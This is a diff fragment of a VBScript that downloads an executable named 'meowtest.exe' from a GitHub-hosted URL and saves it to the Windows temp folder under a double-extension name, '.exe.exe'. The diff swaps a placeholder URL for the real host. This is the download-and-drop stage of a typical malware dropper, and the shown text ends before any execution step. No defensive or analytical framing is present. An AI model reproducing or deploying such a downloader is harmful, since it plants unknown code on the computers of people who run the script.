@@ -1,10 +1,10 @@
 Set x=CreateObject("MSXML2.XMLHTTP")
-x.Open "GET","http directory",False
+x.Open "GET","https://github.com/Homleds/Homleds.github.io/blob/main/meowtest.exe",False
 x.Send
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set temp = fso.GetSpecialFolder(2)
-tempFile = temp & "\main.exe"
+tempFile = temp & "\meowtest.exe.exe"
 
 Set stream = CreateObject("ADODB.Stream")
 stream.Type = 1
